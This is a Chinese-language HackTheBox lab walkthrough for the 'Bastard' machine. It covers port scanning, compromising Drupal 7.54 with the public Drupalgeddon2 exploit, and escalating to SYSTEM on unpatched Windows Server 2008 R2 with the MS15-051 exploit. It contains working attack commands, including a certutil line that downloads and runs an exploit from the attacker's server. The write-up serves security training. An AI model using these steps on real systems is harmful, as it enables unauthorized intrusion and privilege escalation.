> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oUhWIK9Joo6ltCZJ9cyfaw)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ib4Xe2ypTAhxNpnc4UXAUob77IV2JYqPTClxvUeB694gATfJOibp7ePFQ/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
https://app.hackthebox.com/machines/Bastard
```

靶场: HackTheBox.com

靶机名称: Bastard

难度: 中等

提示信息:

```
无
```

目标: user.txt 和 root.txt

实验环境
----

```
攻击机:Kali 10.10.16.3

靶机:10.10.10.9
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo masscan -p1-65535 -i tun0 10.10.10.9 --max-rate 1000
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibXkMzNF7PEhFEAXPMLaSzNvITnria8wmfEueqHTd9vf9RlUdSfcIHr1w/640?wx_fmt=png)

```
sudo nmap -sC -sV -p 80,135,49154 -O 10.10.10.9 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibWPokPVnETXHJhMg0apDhDFAHVx27W1Uwd2x0YK30qql3NwDqWdOib0g/640?wx_fmt=png)

从扫描结果中看到 80 端口由 IIS7.5 开启的并且存在 robots.txt 文件，先来看看 80 端口

Web 渗透
------

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibN8FDVLcYribtyzPhBnUpBCfG9MDZIp1NFLiaXTIxaQ4jewTdSnq3iaCbg/640?wx_fmt=png)

访问后来到登录页面，通过 logo 和页面下方的提示均可知道 CMS 程序是 Drupal，在 nmap 扫描结果的 robots.txt 内容中有版本变更文件 CHANGELOG.txt，访问看看来确认版本

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ib6iahTt2eU50U9rkogELGqMLq1kxUYRNQDPusLm53MmcxcdlhURicVuiaQ/640?wx_fmt=png)

发现版本为 Drupal 7.54，通过搜索引擎查找是否存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibicAwO3vSIGGshKqpvmIBwlcFEbP7ct667tkPD8u8D63uibaxtwVEXW9A/640?wx_fmt=png)

```
https://github.com/dreadlocked/Drupalgeddon2
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibPu7uhYeTNG4tibD5SUQDsDwPBzrEmchhZrz9sqTQeKf9M7B33CibxWqw/640?wx_fmt=png)

下载 exp

```
git clone https://github.com/dreadlocked/Drupalgeddon2.git
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibhz1FrRbHIj8FFZTkysLqFehuqMbRI1d9eNabr1WiadYibUVdIFGloOxw/640?wx_fmt=png)

验证 exp

```
sudo gem install highline
ruby drupalgeddon2.rb http://10.10.10.9 --authentication
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibnT4DsAIX9uYnm6ia2QXqHjDY2P8Sv0qFDuwianyichueQMiaxdDzSAjPkA/640?wx_fmt=png)

运行后出现 几个提示要求输入内容，一路回车不用管

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibMQhge3TWMRnLLjQd4qtfTtkPibewicz8M79wcAgeG9r7nuWbRpKkTCQw/640?wx_fmt=png)

经过 exp 的不懈努力拿到了 shell，先找找 flag

```
type c:\users\dimitris\desktop\user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibCm7eCD28MTGKMLrLMGDDNQXlIFls9oUKhnbRAnSLloBnKEYBAAISpw/640?wx_fmt=png)

拿到 user.txt，再来看看如何提权

```
systeminfo
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibCmQtKpgnQdAW54eeJTSG5dBibh6vsTFAX6qRSH8n20YYZoGnvkLcghQ/640?wx_fmt=png)

这是一台 Windows Server 2008 R2 数据中心系统，并且未打过任何补丁，找个内核提权的 exp 来验证下

```
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibkW3bWqQlgQHGcDX9y05ictNtBnfuuhdLvfefLbBoicYqCvibjT5uKYiaww/640?wx_fmt=png)

下载这个 exp 并验证

```
proxychains wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
unzip MS15-051-KB3045171.zip
cd MS15-051-KB3045171
ls
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibOL4RHCHNJ5ib9gdeibHnlBxK5q8nWBzI0yNZKnUiapsoHhsccyC4v5Nmg/640?wx_fmt=png)

1。在 exp 目录下开启 HTTP 服务

```
py3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibRDcgz1njICy336ZpE5sUNwDk2BnpAPdnqGHwD5dUvuh4nTXY0PC0bg/640?wx_fmt=png)

2。靶机上下载 exp 并执行

```
certutil.exe -urlcache -split -f http://10.10.16.3:8000/ms15-051x64.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibe0zhP82RcxdticnGkktAkWuL45ld4Wzmv7ZwxYd9JpiamWBfSkfCvuiaw/640?wx_fmt=png)

验证成功，可以通过这个 exp 来执行 system 权限，来找找 root 的 flag

```
ms15-051x64.exe "cmd /c type c:\Users\administrator\desktop\root.txt"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibFZziboBxiaicAB7ic9YIvFibPVsEpLRSwY4X9AU4ibkFSXliaOibykVpJicibmYw/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibqfmf332cT58Wib2KbkAHoSOt4HuVS6jA40utG1mlnjKunM0VcZTzksw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ibWIZTBE3ibeTYrhWNtmcqrVt6fxGsxO2a4ZOgTFAOicc1yBxoo82gSwhQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUtkQkUdsg3EiazEe45RpOV2ib2tUsYiarJUVjWibDibPjbOdDcf3kUVwQRwgLibdccQ7xp7ice7o4B3qKvwg/640?wx_fmt=jpeg)